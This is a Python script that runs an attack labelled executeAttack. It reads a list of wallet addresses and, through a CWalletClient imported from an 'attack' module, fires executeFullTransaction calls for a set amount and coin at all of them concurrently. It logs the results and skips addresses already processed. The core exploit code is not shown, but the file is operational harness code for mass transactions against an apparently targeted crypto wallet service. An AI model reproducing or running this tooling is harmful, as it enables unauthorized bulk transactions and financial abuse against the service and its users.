import asyncio
import aiofiles
import aiocsv
import json
import csv
import asyncio
from coin import CryptoCoin
from attack import CWalletClient
from pathlib import Path

lock = asyncio.Lock()


def getDataFilePath(filename: str) -> Path:
    """
    Returns a Path object to a data file located in the 'data' folder
    one level above the current script.
    """
    script_dir = Path(__file__).parent
    return script_dir.parent / "data" / filename


def read_addresses(file_path: Path) -> list[str]:
    """
    Reads a text file containing wallet addresses (one per line)
    and returns a list of addresses.
    """
    addresses = []
    if not file_path.exists():
        return addresses

    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            address = line.strip()
            if address:
                addresses.append(address)

    return addresses


def read_processed_addresses(results_file: Path) -> set[str]:
    """
    Reads processed addresses from results CSV file.
    Returns a set for fast lookup.
    """
    processed = set()

    if not results_file.exists():
        return processed

    with open(results_file, "r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            processed.add(row["address"])

    return processed


async def worker(client: CWalletClient, address: str, amount: str, coin: CryptoCoin, writer) -> None:
    data = await client.executeFullTransaction(address, amount, coin)

    async with lock:
        await writer.writerow({"address": address, "result": json.dumps(data)})


async def executeAttack(addressesFileName: str, resultsFileName: str, client: CWalletClient, coin: CryptoCoin, amount: str) -> None:

    addresses_file = getDataFilePath(addressesFileName)
    results_file = getDataFilePath(resultsFileName)

    # 1️⃣ Read already processed
    processed_addresses = read_processed_addresses(results_file)

    # 2️⃣ Read all addresses
    all_addresses = read_addresses(addresses_file)

    # 3️⃣ Subtract (Method 3 – ordered filtering with set)
    remaining_addresses = [
        addr for addr in all_addresses
        if addr not in processed_addresses
    ]

    print(f"Total addresses: {len(all_addresses)}")
    print(f"Already processed: {len(processed_addresses)}")
    print(f"Remaining to process: {len(remaining_addresses)}")

    if not remaining_addresses:
        print("Nothing to process.")
        return

    # 4️⃣ Open results file in append mode
    file_exists = results_file.exists()

    async with aiofiles.open(results_file, mode="a", newline="") as afp:
        writer = aiocsv.AsyncDictWriter(
            afp,
            fieldnames=["address", "result"]
        )

        # Write header only if file didn't exist
        if not file_exists:
            await writer.writeheader()

        tasks = []
        for address in remaining_addresses:
            tasks.append(worker(client, address, amount, coin, writer))

        await asyncio.gather(*tasks)

